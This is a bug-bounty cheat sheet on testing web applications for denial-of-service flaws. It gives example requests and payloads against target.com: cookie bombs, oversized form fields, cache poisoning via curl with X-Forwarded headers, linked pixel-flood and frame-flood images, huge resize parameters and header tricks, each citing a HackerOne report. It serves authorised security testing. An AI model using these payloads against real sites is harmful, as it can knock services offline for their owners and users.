# Denial of Service

1. Cookie bomb
```
https://target.com/index.php?param1=xxxxxxxxxxxxxxxxxxxxxx
```
After input "xxxxxxxxxxxxxxxxxxxxxx" as a value of param1, check your cookies. If there is cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable

References: [Hackerone #105363](https://hackerone.com/reports/105363)

2. Try input a very long payload to form. For example using very long password or using very long email
```
POST /Register
[...]

username=victim&password=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

References: [Hackerone #840598](https://hackerone.com/reports/840598)

3. Cache poisoning, can using header "X-Forwarded-Port" or "X-Forwarded-Host"
```
curl -H "X-Forwarded-Port: 123" https://target.com/index.php?poison=1
```
```
curl -H "X-Forwarded-Host: target.com:123" https://target.com/index.php?poison=1
```

Reference: [Hackerone #409370](https://hackerone.com/reports/409370)

4. Pixel flood, using image with a huge pixels

Download the payload: [Here](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/000/128/5f5a974e5f67ab7a11d2d92bd40f8997969f2f17/lottapixel.jpg?response-content-disposition=attachment%3B%20filename%3D%22lottapixel.jpg%22%3B%20filename%2A%3DUTF-8%27%27lottapixel.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFO7EZHL%2F20200910%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200910T110133Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFIaCXVzLXdlc3QtMiJGMEQCIGgY3dUtffr4V%2BoxTJaFxc%2F7qjRodT3XLyN1ZLEF8%2FhfAiAXklx1Zvy3iKIGm1bocpDUP1cTx46eTbsDOKqRC93fgyq0AwhbEAEaDDAxMzYxOTI3NDg0OSIMH9s8JiCh%2B%2FNADeibKpEDocuqfbmxkM5H5iKsA3K4RuwcxVT9ORLJrjJO%2FILAm%2BcNsQXTgId%2Bpw1KOLkbFKrq0BQIC6459JtfWqHPXvDC7ZJGboQ%2FXE0F%2BAZQa6jaEyldrkKuDewNy5jy3VX1gquS%2BWrGl%2BGhwmXB4cg1jgOugGUsC%2FxD%2BcragIJAtGA7lp3YdcL%2FiQbnvuzmLP8w%2FyCHPUrpOw94bPOk8fpetOJoLmDfXZdL3hLGBEUGS7dSOoyebLSXGZDctkSpnXCq383lWYWYn0LSv1ooVvuCVzgxE%2BZi4b4QvLjjMG3FJdEX%2BDYmnDvnSrRoDtyj8bD3cP3xbZ3jaNYRbIlQTm2zR1DgoaDGE74FmpZWHcyC8zK0V6AKG6OzkcIaGRnGdDNSpZkN0DrWE7uY6BLiIGY16rflYOaElnbxijoMNDsU3MZH8gGk7crYJ%2FCeHeayInPBDgiREBgn7orAIjOY3xg8vzwKO96a90LmkK7wk977TbKfLIng1iNP9EMKYDjGePdBYDML9zBeqhO5LrVH%2BfbwzG5GXi0w5fnn%2BgU67AFRBwMChVRr%2FLW4j0PqpXUeN5ysVIuagoqSwqOhfwI9rtk56zTuGhO3du4raY5SOQ9vSkRdYHhga%2BW7oQTByD1ISiSaOjHs1s%2FrNfvIfMA8r0drPSykOdCuV2A5NhBpEPpT%2BuOosogdPihcORhO3hbcQJ9y4uxBsaBSJr%2F8S2CGjwZw7SOGmNaNFsPu%2BMRbYDA%2FH2eUMBl96w6KpUuNAXEPUcfq3weRMP1vXW62S4OyniYJ6DEVRkkE4eFZMUqy4c94uwSAegK54Po0V0sPM%2FncTESCgBf7Qe2zZlPhdRGZR%2F25cF6JTH0t2VIRQw%3D%3D&X-Amz-Signature=a837cb6b26bf437fa5008695310a21788918081c36e745d286c5cba9fd4a78e0)

References: [Hackerone #390] (https://hackerone.com/reports/390)

5. Frame flood, using GIF with a huge frame

Download the payload: [Here](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/000/136/902000ac102f14a36a4d83ed9b5c293017b77fc7/uber.gif?response-content-disposition=attachment%3B%20filename%3D%22uber.gif%22%3B%20filename%2A%3DUTF-8%27%27uber.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ245MJJPA%2F20200910%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200910T110848Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFMaCXVzLXdlc3QtMiJHMEUCIEC768ifpRHeEUucuNuVL%2FdcSsWMnGeNp%2FMhKs6afB01AiEAiZOP%2FwMaeQMITUni3aFcACIOqOHnWHgLKuXHRrb5LooqtAMIXBABGgwwMTM2MTkyNzQ4NDkiDHHy9PJ2ccl9cmsvyCqRA6bliBHBMPXR6NYflM%2BCXCCQ5VLdPCATpmLs9DhVuYsjxR3JUtVHnBvtfEYYWDWWsLoC3xuzmug5ycrAvqK%2BTYDYO7l4HD1rXfyEBkR579ZlUFab6bOL4i8nDqblun%2FeV253Sgd6GzL4E%2FXmUN%2FC6qNydSd9hp2fLoyNjqob6o5zJjmnqvZsq50ROOZwf1idkDtr163qeVZERnan7aY9rM%2FsX4iVdE4wY0rLw1maGRuDF2aLVCxPB681htsHt%2FpoZ18QY7LjcbNjbjB4PgXLd1sm5zQ4q9mPVxTZPvzo9BJCh7l6kMLHCtJXOXfrvvN8UBgIqr1KXvodzv7FRQYcvEpfw4pwCTWzBs8VeEcwS9gjOXFMNLNI8SZ9V76VQ5KrOIpKhzM9UQQN3DVzY3SwMHydX%2B%2BYcQTt%2FjvqTkorsltqob2g5E1K0U8btRLBvBqOo0Vbr75zLcLUUomDBQzSNSvJgTN43huYmkZxBpWAAId72Tt6m56aFQLXkCKGSoMxYjrrVW9jc37pVl3lZU7FIX0AMIuN6PoFOusBpDCrjFwR1Y7t7W8wLapYjI6yOkkvWTFwWvx38jZl9okqo5xchKolmKxKX7cfGPIyuUmSXc1xa0nKwYeOYlhQZfyI0NobqyWW81ITuuUjsBxULuqrXqfVl0PTjTTpqe%2FHvU6wYSE358XfggtcqaH9PPgNDOejgv%2FLnh9AH9nyqIWuaCu865IfAOupVVzFzQilyB2LDyQtTS4Kp5dHyEAibRQlqeKHWOkUE2mQefAaTxKLRKrs0mJQYSuC%2B4LQEB3Cq9Nhj5HN%2BYT7A7CDLrvyChyfYXQZYr0lR1jN91Yd7SBe2jB1Qls%2Bx%2FEUlQ%3D%3D&X-Amz-Signature=910a3812cf3b69f6fa72f39a89a6df2f395f8d17ef8702eeb164a0477c64fff5)

References: [Hackerone #400] (https://hackerone.com/reports/400)

**Rare cases**
1. Sometimes in website we found a parameter that can adjust the size of the image, for example
```
https://target.com/img/vulnerable.jpg?width=500&height=500
```
Try change "500" to "99999999999"
```
https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999
```

References: [Hackerone #751904](https://hackerone.com/reports/751904)

2. Try changing the value of the header with something new, for example:
```
Accept-Encoding: gzip, gzip, deflate, br, br
```

References: [Hackerone #861170](https://hackerone.com/reports/861170)

3. Sometimes if you try bug "No rate limit", after a long try it. The server will go down because there is so much requests

References: [Hackerone #892615](https://hackerone.com/reports/892615)
